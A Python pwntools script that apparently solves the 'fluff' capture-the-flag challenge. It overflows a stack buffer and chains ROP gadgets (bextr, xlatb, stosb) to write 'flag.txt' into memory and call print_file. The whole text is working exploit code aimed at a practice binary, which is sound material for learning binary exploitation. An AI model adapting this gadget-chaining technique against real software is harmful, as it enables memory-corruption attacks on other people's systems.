from pwn import *
import ctypes

elf = ELF("./fluff")

p = process("./fluff")
p.recvuntil('> ')


stosb = p64(0x0000000000400639)
writable_area = p64(0x0000000000601028)
print_file = p64(0x400510)
pop_rdi = p64(0x00000000004006a3)
xlatb = p64(0x0000000000400628)
mov_rax_0_pop_rbp = p64(0x0000000000400610)
pop_rbp = p64(0x0000000000400610)
bextr_rbx_rcx_rdx = p64(0x0000000000400633)
pop_rdx = p64(0x000000000040062a)
pop_rcx = p64(0x000000000040062b)
ret = p64(0x0000000000400295)
pop_bextr = p64(0x000000000040062a)

 

def prepare_rbx(target):
	rop = pop_bextr + p64(0x4000) + p64(ctypes.c_ulong(target - 0x3ef2).value)
	return rop

def prepare_al(target, current_al, elf):
	rop = b""
	target_byte_addr = next(elf.search(target))
	rbx = ctypes.c_ulong(target_byte_addr - current_al).value
	rop += prepare_rbx(rbx)
	rop += xlatb
	return rop, target


payload = b''
payload += cyclic(40)
payload += pop_rdi + writable_area

target = b'flag.txt'
prev_al = 0x0b

for b in target:
	rop , prev_al = prepare_al(b, prev_al, p.elf)
	payload += rop + stosb
	

payload += pop_rdi + writable_area + print_file
	 

p.send(payload)					   
p.interactive()
